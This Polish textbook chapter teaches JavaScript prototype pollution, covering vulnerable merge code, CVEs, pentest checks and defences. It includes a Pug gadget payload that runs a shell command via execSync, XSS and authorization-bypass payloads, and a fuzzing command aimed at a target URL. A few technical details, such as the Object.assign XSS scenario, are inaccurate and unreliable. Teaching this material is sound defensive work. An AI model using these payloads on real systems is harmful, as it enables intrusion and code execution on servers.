# Rozdział 7: Prototype Pollution

## 1. Czym jest Prototype Pollution

**Prototype Pollution** to klasa podatności bezpieczeństwa w JavaScript, polegająca na możliwości wstrzyknięcia lub modyfikacji właściwości na `Object.prototype` (lub innych wbudowanych prototypach) poprzez kontrolowane przez atakującego dane wejściowe.

Ponieważ `Object.prototype` jest na szczycie łańcucha prototypów *każdego* obiektu JavaScript, dodanie właściwości do `Object.prototype` sprawia, że ta właściwość pojawia się jako "dziedziczona" przez wszystkie obiekty. To fundamentalna zmiana środowiska runtime — potencjalnie prowadząca do obejścia autoryzacji, zdalnego wykonania kodu (RCE) lub Denial of Service.

Prototype Pollution jest sklasyfikowany jako:
- **CWE-1321** — Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)
- **OWASP A08:2021** — Software and Data Integrity Failures

Podatność dotyczy zarówno:
- **Serwerowego JavaScript** (Node.js) — gdzie może prowadzić do RCE
- **Klienckich aplikacji webowych** — gdzie może prowadzić do XSS, obejścia autoryzacji

---

## 2. Dlaczego powstał (jako podatność)

### Geneza problemu

Prototype Pollution nie jest celowo zaprojektowaną cechą — to konsekwencja kilku projektowych decyzji JavaScript działających razem:

1. **`__proto__` jest magic property**: przypisanie `obj.__proto__ = x` modyfikuje `[[Prototype]]` obiektu, nie tworzy normalnej właściwości o nazwie `__proto__`
2. **`Object.prototype` jest współdzielony**: wszyscy korzystają z tego samego `Object.prototype`
3. **Rekurencyjne merge bez sanityzacji**: popularne biblioteki mergują obiekty "naiwnie", nie sprawdzając kluczy
4. **JSON.parse traktuje `__proto__` normalnie**: `JSON.parse('{"__proto__": {"a": 1}}')` zwraca obiekt z `__proto__` jako normalnym kluczem — ale niektóre funkcje merge interpretują go inaczej

Podatność "objawiła się" szerszemu gronu bezpieczeństwa około 2018-2019, gdy opublikowano CVE dla lodash (CVE-2019-10744), jQuery (CVE-2019-11358) i setek innych bibliotek.

### Dlaczego jest powszechna

Wzorzec "merguj obiekt użytkownika z domyślnym obiektem" jest wszechobecny w JavaScript:

```javascript
// Typowy wzorzec konfiguracji — podatny
function initConfig(userConfig) {
    const defaults = { debug: false, timeout: 5000 };
    return Object.assign(defaults, userConfig); // podatne! (uwaga: Object.assign bez nested)
}

// Wzorzec deep merge w bibliotekach
_.merge({}, userInput); // podatne w starych wersjach lodash
```

---

## 3. Jak działa

### Mechanizm podatności

**Krok 1:** Atakujący dostarcza payload z kluczem `__proto__`:

```json
{
    "name": "normal value",
    "__proto__": {
        "isAdmin": true
    }
}
```

**Krok 2:** Podatna funkcja merge iteruje klucze i przypisuje je:

```javascript
function vulnerableMerge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            vulnerableMerge(target[key], source[key]); // rekurencja
        } else {
            target[key] = source[key]; // przypisanie
        }
    }
}

vulnerableMerge({}, JSON.parse(userInput));
// Gdy key = "__proto__", a source["__proto__"] = {isAdmin: true}:
// target["__proto__"] = target["__proto__"] || {}
// → target.__proto__ to Object.prototype (magic!)
// vulnerableMerge(Object.prototype, {isAdmin: true})
// → Object.prototype["isAdmin"] = true
```

**Krok 3:** `Object.prototype.isAdmin = true` — teraz KAŻDY obiekt ma `isAdmin = true`:

```javascript
const user = { name: "Alice" };
console.log(user.isAdmin); // true — przez Prototype Chain!
```

**Krok 4:** Aplikacja sprawdza uprawnienia naiwnie:

```javascript
if (user.isAdmin) {
    grantAdminAccess(); // tak! — chociaż user nie jest adminem
}
```

### Trzy wektory dostępu do prototypu

```
Wektor 1: __proto__
──────────
target["__proto__"]["isAdmin"] = true
→ Object.prototype.isAdmin = true

Wektor 2: constructor.prototype
──────────────────────────────
target["constructor"]["prototype"]["isAdmin"] = true
→ Object.prototype.isAdmin = true

Wektor 3: prototype (bezpośredni)
─────────────────────────────────
// Gdy target to funkcja/klasa:
target["prototype"]["isAdmin"] = true
```

### Skutki pollution

```
Object.prototype.isAdmin = true
            │
            ├── const obj = {}; obj.isAdmin → true
            ├── const arr = []; arr.isAdmin → true
            ├── const fn = function(){}; fn.isAdmin → true
            ├── const date = new Date(); date.isAdmin → true
            └── ... KAŻDY obiekt ...
```

---

## 4. Co dzieje się wewnętrznie

### JSON.parse a __proto__

Ważne: `JSON.parse('{"__proto__": {"x": 1}}')` tworzy obiekt z *własną* właściwością o nazwie `"__proto__"` — nie modyfikuje prototypu:

```javascript
const parsed = JSON.parse('{"__proto__": {"x": 1}}');

console.log(parsed.hasOwnProperty("__proto__")); // true — własna właściwość!
console.log(Object.getPrototypeOf(parsed));        // Object.prototype — bez zmian

// To jest BEZPIECZNE — JSON.parse nie interpretuje __proto__ jako magic
```

Problem pojawia się gdy podatna funkcja merge *używa* tego obiektu:

```javascript
function merge(target, source) {
    for (let key in source) { // iteruje, w tym __proto__
        if (key === "__proto__" && source[key] && typeof source[key] === 'object') {
            // NIE: target["__proto__"] = {x: 1}
            // Ale: merge(Object.prototype, {x: 1}) — POLLUTION!
            merge(target[key], source[key]);
        }
    }
}
```

Kluczowa różnica:
- `target["__proto__"] = value` → modyfikuje `[[Prototype]]` target (lub jest magic accessor)
- `target.__proto__ = value` → modyfikuje `[[Prototype]]` przez accessor
- `Object.defineProperty(target, "__proto__", {value: ...})` → tworzy własną właściwość bez magic

### Silnik V8 — jak traktuje `__proto__`

W V8 `__proto__` jest **accessorem** zdefiniowanym na `Object.prototype`:

```javascript
// Uproszczone — tak działają __proto__ getters/setters:
Object.defineProperty(Object.prototype, "__proto__", {
    get() { return Object.getPrototypeOf(this); },
    set(value) { Object.setPrototypeOf(this, value); }
});
```

Stąd: `obj.__proto__` to wywołanie gettera, nie odczyt własnej właściwości.

### Wpływ na for...in i Object.keys

```javascript
Object.prototype.injected = "attacker";

const obj = { own: "value" };

// for...in iteruje po CAŁYM łańcuchu (w tym prototype)
for (let key in obj) {
    console.log(key); // "own", potem "injected" z Object.prototype
}

// Object.keys() — tylko własne właściwości
Object.keys(obj); // ["own"] — bezpieczne!

// Podatny kod iterujący for...in:
for (let key in config) {
    processConfig(key, config[key]); // przetworzy "injected" z pollution!
}
```

---

## 5. Analogiczny przykład z życia

Wyobraź sobie wzorzec DNA firmy:

- Każdy pracownik dziedziczy "bazowy profil" z firmowego szablonu (`Object.prototype`)
- Template mówi: "domyślnie: brak uprawnień administratora"
- Atakujący dostaje się do działu HR i zmienia szablon: "domyślnie: pełne uprawnienia administratora"
- Od teraz KAŻDY nowy i stary pracownik "dziedziczy" te uprawnienia z szablonu

Nikt nie musi osobno nadawać uprawnień — wystarczyło zmienić jeden template. To Prototype Pollution.

---

## 6. Przykład kodu

```javascript
// === PODATNA FUNKCJA MERGE ===
function deepMerge(target, source) {
    // UWAGA: ta implementacja jest celowo podatna
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]); // rekurencja bez sprawdzania klucza
        } else {
            target[key] = source[key]; // bezpośrednie przypisanie
        }
    }
    return target;
}

// === PAYLOAD ATAKUJĄCEGO ===
// Zakładamy że input pochodzi np. z body HTTP request
const userInput = JSON.parse(`{
    "username": "alice",
    "__proto__": {
        "isAdmin": true,
        "canDelete": true
    }
}`);

// === WYWOŁANIE PODATNEJ FUNKCJI ===
const config = {};
deepMerge(config, userInput);

// Po merge:
// config.username = "alice" → OK, własna właściwość
// Object.prototype.isAdmin = true → ZANIECZYSZCZENIE!
// Object.prototype.canDelete = true → ZANIECZYSZCZENIE!

// === SKUTKI ===
const regularUser = { name: "Bob" };
console.log(regularUser.isAdmin);   // true — przez prototype chain!
console.log(regularUser.canDelete); // true — przez prototype chain!

// Sprawdzenie autoryzacji — teraz złamane
function deleteUser(requestingUser, targetId) {
    // regularUser.canDelete = true (z pollution) → Bob może usuwać użytkowników!
    if (requestingUser.canDelete) {
        users.delete(targetId); // wykonuje bez uprawnień!
    }
}
```

**Wyjaśnienie linijka po linijce:**

1. `JSON.parse(...)` — tworzy obiekt JavaScript z `__proto__` jako *własną właściwością*
2. `deepMerge(config, userInput)` — startuje merge
3. W pętli `for (let key in source)` → iteruje klucze: "username", "__proto__"
4. Dla klucza `"__proto__"`: `source["__proto__"]` = `{isAdmin: true}` → obiekt
5. `target["__proto__"]` — to accessor! Zwraca `Object.prototype` (nie tworzy własnej właściwości)
6. `deepMerge(Object.prototype, {isAdmin: true})` — rekurencja na Object.prototype!
7. `Object.prototype["isAdmin"] = true` — zanieczyszczenie!
8. Każdy nowy `{}` "dziedziczy" `isAdmin: true` przez Prototype Chain

---

## 7. Przykład z prawdziwej aplikacji

### CVE-2019-10744 — Lodash

Lodash to najpopularniejsza biblioteka utility w npm (~50M pobrań tygodniowo). Wersje < 4.17.12 były podatne:

```javascript
// Podatna wersja lodash (< 4.17.12)
const _ = require('lodash');

// Payload: użytkownik może wysłać settings z __proto__
const userSettings = JSON.parse(req.body); // {"__proto__": {"admin": true}}

// Podatna funkcja merge
_.merge({}, userSettings); // → Object.prototype.admin = true

// Efekt: każdy obiekt ma .admin = true
const checkPermissions = {};
if (checkPermissions.admin) { // true! — przez polluted prototype
    grantAdminAccess(user);
}
```

### CVE-2019-11358 — jQuery

```javascript
// Podatna wersja jQuery (< 3.4.0)
$.extend(true, {}, JSON.parse('{"__proto__": {"xss": "<img src=x onerror=alert(1)>"}}'));

// Jeśli aplikacja używa polluted wartości w innerHTML:
document.body.innerHTML = someObject.xss; // XSS!
```

### Hackowanie aplikacji Express.js przez template engines

```javascript
// Scenariusz z Pug (template engine) — RCE przez Prototype Pollution
const pug = require('pug');
const express = require('express');
const _ = require('lodash'); // podatna wersja

app.post('/settings', (req, res) => {
    // Pollution przez lodash.merge
    _.merge({}, req.body); // {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');s"}}
    
    // Pug sprawdza options.outputFunctionName przez Object.prototype lookup
    const template = pug.render("p Hello"); // używa polluted outputFunctionName!
    // → RCE! Wykonuje kod systemowy
});
```

To jest prawdziwy scenariusz RCE przez Prototype Pollution + template engine gadget.

---

## 8. Typowe błędy programistów

### Błąd 1: Naiwna implementacja deep merge

```javascript
// PODATNE — typowa implementacja "deep merge"
function merge(a, b) {
    for (let k in b) {
        if (b[k] && typeof b[k] === 'object') {
            a[k] = a[k] || {};
            merge(a[k], b[k]); // brak sprawdzania k === '__proto__'
        } else {
            a[k] = b[k];
        }
    }
    return a;
}
```

### Błąd 2: Używanie for...in na niezaufanym input

```javascript
// PODATNE
function copyConfig(userConfig) {
    const config = { debug: false };
    for (let key in userConfig) { // iteruje przez prototype chain!
        config[key] = userConfig[key];
    }
}
```

### Błąd 3: Sprawdzanie właściwości przez in zamiast hasOwnProperty

```javascript
// PODATNE — 'isAdmin' może pochodzić z pollution
if ('isAdmin' in user) { ... }

// BEZPIECZNE — sprawdza tylko własne właściwości
if (Object.prototype.hasOwnProperty.call(user, 'isAdmin')) { ... }
// lub Object.hasOwn(user, 'isAdmin') w ES2022
```

### Błąd 4: Użycie undefined jako sentinel zamiast null

```javascript
// PODATNE — undefined może zostać dostarczone przez pollution
function getConfig(key) {
    return config[key] !== undefined ? config[key] : defaults[key];
    // Jeśli Object.prototype[key] = "polluted", config[key] zwróci to!
}

// BEZPIECZNE
function getConfig(key) {
    return Object.prototype.hasOwnProperty.call(config, key) 
        ? config[key] 
        : defaults[key];
}
```

---

## 9. Znaczenie dla bezpieczeństwa

### Klasyfikacja podatności

Prototype Pollution może prowadzić do:

1. **Ominięcie autoryzacji (Logic Bypass)** — `isAdmin: true` w każdym obiekcie
2. **Cross-Site Scripting (XSS)** — wstrzyknięcie payloadu do właściwości używanych w template'ach
3. **Remote Code Execution (RCE)** — w Node.js przez "gadgety" w template engines
4. **Denial of Service (DoS)** — modyfikacja metod wbudowanych jak `toString`, `valueOf`
5. **Data Manipulation** — zmiana wartości konfiguracyjnych wpływających na logikę

### Known CVE

| CVE | Biblioteka | Wersja | Typ |
|-----|-----------|--------|-----|
| CVE-2019-10744 | lodash | < 4.17.12 | RCE/Logic |
| CVE-2019-11358 | jQuery | < 3.4.0 | XSS |
| CVE-2020-8203 | lodash | < 4.17.19 | zipObjectDeep |
| CVE-2019-0393 | extend | < 3.0.2 | Logic |
| CVE-2021-23337 | lodash | < 4.17.21 | Command Injection |
| CVE-2020-28477 | immer | < 8.0.1 | Logic |

### RCE Gadgets — mechanizm

W Node.js pewne moduły czytają właściwości obiektów przez Prototype Chain i mogą wykonać kod:

```
Zanieczyszczony prototyp
        │
        ▼
Moduł czyta Object.prototype.property
        │
        ▼
Właściwość zawiera złośliwy string
        │
        ▼
Moduł interpoluje/ewaluuje string
        │
        ▼
RCE
```

Znane "gadgety":
- **Pug**: `outputFunctionName`, `self`
- **EJS**: `escapeXML`, `outputFunctionName`
- **Handlebars**: `helperMissing`
- **child_process**: `shell`
- **node-fetch**: `timeout`

### Powiązane OWASP

- **A08:2021 – Software and Data Integrity Failures**
- **A03:2021 – Injection** (gdy prowadzi do XSS/RCE)

---

## 10. Jak identyfikować podczas pentestu

### Manualny test — weryfikacja podatności

```javascript
// Test 1: Podstawowe sprawdzenie
const originalTest = {};
console.log(originalTest.polluted); // powinna być undefined przed testem

// Wyślij payload do aplikacji przez Burp Suite
// POST /api/settings: {"__proto__": {"polluted": true}}

// Sprawdź po wysłaniu:
const newTest = {};
console.log(newTest.polluted); // jeśli true → PODATNA!

// Test 2: Wektor constructor.prototype
// Payload: {"constructor": {"prototype": {"polluted": "yes"}}}

// Test 3: Dla bibliotek deep merge
// Payload: {"a": 1, "__proto__": {"isAdmin": true}}
```

### Narzędzia

**ppfuzz** (Prototype Pollution Fuzzer):
```bash
# Automatyczne testowanie
npx ppfuzz -u "https://target.com/api/endpoint" -m POST -H "Content-Type: application/json" -d '{}'
```

**NodeJS Prototype Pollution Scanner**:
```bash
# Skanowanie kodu
npx proto-pollution-scanner ./src
```

**Burp Suite Extension**: `JS Prototype Pollution` przez BApp Store

### Identyfikacja przez DevTools

```javascript
// Uruchom PRZED testem — zapisz stan
const before = Object.getOwnPropertyNames(Object.prototype).length;

// Wykonaj podejrzaną akcję (submit formularza, call API)

// Sprawdź PO akcji
const after = Object.getOwnPropertyNames(Object.prototype).length;
console.log("Nowe właściwości:", after - before); // >0 → pollution!

// Znajdź dodane właściwości
const expected = new Set(["hasOwnProperty", "isPrototypeOf", /* ... */]);
Object.getOwnPropertyNames(Object.prototype)
    .filter(k => !expected.has(k))
    .forEach(k => console.log("Polluted:", k, Object.prototype[k]));
```

### Szukanie podatnych bibliotek

```bash
# W kodzie źródłowym:
grep -r "deepMerge\|_.merge\|jQuery.extend\|Object.assign" ./src

# W package.json:
cat package.json | grep -E '"lodash"|"jquery"|"extend"|"merge"'

# npm audit:
npm audit 2>/dev/null | grep -i "prototype"
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy aplikacja akceptuje JSON w body i wykonuje na nim deep merge?
□ Payload {"__proto__": {"x": 1}} — czy {}.x jest teraz 1?
□ Payload {"constructor": {"prototype": {"x": 1}}} — podobny test
□ Czy for...in jest używany na danych wejściowych bez filtrowania?
□ Czy hasOwnProperty lub Object.hasOwn jest używane przed sprawdzaniem właściwości?
□ Czy npm audit wykrywa podatne biblioteki (lodash, jquery, extend, merge)?
□ Czy Object.create(null) jest używane dla słowników/cache zamiast {}?
□ Czy Object.prototype jest zamrożony (Object.freeze) jako dodatkowa ochrona?
□ Czy walidacja schema (Ajv, joi) blokuje klucze __proto__ i constructor?
□ Czy aplikacja serwerowa (Node.js) używa podatnych template engines (pug, ejs)?
□ Czy pollution Object.prototype.toString może wywołać nieoczekiwane zachowania?
□ Czy po "wyleczeniu" pollution jest możliwa persistencja między requestami (shared state)?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Ominięcie autoryzacji (Authorization Bypass)

**Wymagania:**
- Aplikacja używa podatnej funkcji deep merge
- Autoryzacja sprawdzana przez właściwość obiektu (np. `user.isAdmin`)

**Przebieg:**
1. Pentester identyfikuje endpoint przyjmujący JSON body
2. Wysyła payload: `{"__proto__": {"isAdmin": true}}`
3. Aplikacja merguje z obiektem użytkownika przez podatną funkcję
4. `Object.prototype.isAdmin = true`
5. Każde sprawdzenie `if (user.isAdmin)` zwraca true
6. Pentester uzyskuje dostęp do funkcji adminowych

**Weryfikacja:**
```javascript
// W konsoli przeglądarki po wysłaniu payloadu
const testObj = {};
console.log(testObj.isAdmin); // true → podatność potwierdzona
```

**Ograniczenia:** Pollution resetuje się przy przeładowaniu strony (client-side) lub restarcie serwera (server-side).

### Scenariusz 2: RCE przez Pug Template Engine (Node.js)

**Wymagania:**
- Node.js z podatną biblioteką (lodash < 4.17.12)
- Pug/Jade jako template engine

**Payload:**
```json
{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id > /tmp/pwned');s"
    }
}
```

**Przebieg:**
1. `lodash.merge` pollutuje `Object.prototype.outputFunctionName`
2. Pug przy kompilacji template sprawdza options przez `for...in` (lub bezpośredni dostęp)
3. Odczytuje `outputFunctionName` z polluted prototypu
4. Wstrzykuje wartość do generowanego kodu JavaScript
5. Wykonuje go → RCE

**Wpływ:** Pełna kontrola serwera.

### Scenariusz 3: XSS przez DOM Prototype Pollution

**Wymagania:**
- Podatna biblioteka client-side (jQuery < 3.4.0)
- Aplikacja używa `$.extend(true, ...)` z danymi z URL/input

**Przebieg:**
```javascript
// URL: /app?config={"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}

const userConfig = parseURLConfig(); // {"__proto__": {"innerHTML": "XSS payload"}}
$.extend(true, {}, userConfig); // pollution

// Gdzieś w aplikacji:
const div = document.createElement("div");
Object.assign(div, someObject); // someObject.innerHTML z pollution → XSS
```

---

## 13. Jak się zabezpieczać

### Bezpieczna implementacja deep merge

```javascript
function secureMerge(target, source, depth = 0) {
    if (depth > 10) throw new Error("Max merge depth exceeded");
    
    // Lista zakazanych kluczy
    const FORBIDDEN = new Set(["__proto__", "constructor", "prototype"]);
    
    // Użyj Object.keys — nie for...in (nie iteruje po prototype chain)
    for (const key of Object.keys(source)) {
        if (FORBIDDEN.has(key)) continue; // pomiń niebezpieczne klucze
        
        const srcVal = source[key];
        
        if (srcVal !== null && typeof srcVal === 'object' && !Array.isArray(srcVal)) {
            // Upewnij się że target[key] to własna właściwość
            if (!Object.prototype.hasOwnProperty.call(target, key)) {
                Object.defineProperty(target, key, {
                    value: Object.create(null), // null prototype dla bezpieczeństwa
                    writable: true,
                    enumerable: true,
                    configurable: true
                });
            }
            secureMerge(target[key], srcVal, depth + 1);
        } else {
            target[key] = srcVal;
        }
    }
    
    return target;
}
```

### Walidacja JSON Schema

```javascript
const Ajv = require("ajv");
const ajv = new Ajv({ strict: true });

const userSettingsSchema = {
    type: "object",
    additionalProperties: false, // KLUCZOWE — blokuje nieznane klucze!
    properties: {
        theme: { type: "string", enum: ["light", "dark"] },
        language: { type: "string", pattern: "^[a-z]{2}$" }
    }
};

const validate = ajv.compile(userSettingsSchema);

app.post('/settings', (req, res) => {
    if (!validate(req.body)) {
        return res.status(400).json({ error: validate.errors });
    }
    // Teraz req.body nie zawiera __proto__ ani constructor
    applySettings(req.body);
});
```

### Object.freeze dla ochrony prototypów

```javascript
// Zamróź kluczowe prototypy przed startem aplikacji
// UWAGA: przetestuj z bibliotekami! Niektóre modyfikują prototypy.
Object.freeze(Object.prototype);
Object.freeze(Object.freeze);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);

// Teraz próba pollution rzuci TypeError (strict) lub cicho nie zadziała (non-strict)
```

### Używaj Map zamiast {} dla słowników

```javascript
// {} podatne — może mieć właściwości z Object.prototype
const config = {};
config["someKey"] = "value";
config["__proto__"] // → Object.prototype (magic!)

// Map — brak prototype pollution
const safeConfig = new Map();
safeConfig.set("someKey", "value");
safeConfig.get("__proto__"); // undefined — normalna wartość
```

### Aktualizuj zależności i używaj npm audit

```bash
npm audit
npm audit fix

# Sprawdź konkretne podatności
npm audit --audit-level critical

# Wymuszaj aktualne wersje
npm update lodash  # upewnij się że >= 4.17.21
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Prototype Pollution = możliwość modyfikacji `Object.prototype` przez dane użytkownika
2. Skutki: ominięcie autoryzacji, XSS, RCE (przez gadgety), DoS
3. Wektory: `__proto__`, `constructor.prototype`, `prototype` w rekurencyjnym merge
4. Podatne są biblioteki: lodash < 4.17.12, jQuery < 3.4.0, extend, merge, deepmerge
5. Ochrona: walidacja schema, bezpieczne merge, Object.create(null), Object.freeze

**Najczęstsze nieporozumienia:**

- "`JSON.parse` powoduje Prototype Pollution" — NIE samo w sobie. JSON.parse tworzy własną właściwość `__proto__`. Problem jest w *podatnej funkcji merge* która potem używa tego obiektu.
- "Prototype Pollution to tylko problem Node.js" — NIE. Dotyczy też front-endu — może prowadzić do XSS lub logicznych błędów autoryzacji.
- "Object.assign jest podatny na Prototype Pollution" — NIE bezpośrednio. `Object.assign` kopiuje *własne enumerable* właściwości. Ale podatna jest iteracja po kluczach źródła gdy źródło ma `__proto__` jako własną właściwość.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools Console** → sprawdź `Object.getOwnPropertyNames(Object.prototype)` — czy są niestandardowe właściwości?
2. **Network → Burp Suite** → szukaj requestów z JSON body → wyślij payload z `__proto__`
3. **Sources** → szukaj `_.merge(`, `deepMerge(`, `$.extend(true,` → podatne wzorce
4. **npm audit** → sprawdź CVE dla zainstalowanych bibliotek
5. **Automation**: użyj ppfuzz lub Burp Suite extension do automatycznego testowania

---

## Powiązania

```
Prototype Pollution
        │
        ├──► Prototype Chain (Rozdział 6)
        │         Mechanizm umożliwiający podatność
        │
        ├──► DOM (Rozdział 9)
        │         Pollution może wpłynąć na właściwości DOM elementów
        │
        ├──► XSS (Rozdział 9, 10, 36)
        │         Pollution może prowadzić do XSS przez template injection
        │
        ├──► CSP (Rozdział 36)
        │         CSP nie chroni bezpośrednio przed Prototype Pollution
        │
        └──► Trusted Types (Rozdział 37)
                  Trusted Types mogą ograniczyć skutki XSS przez pollution
```
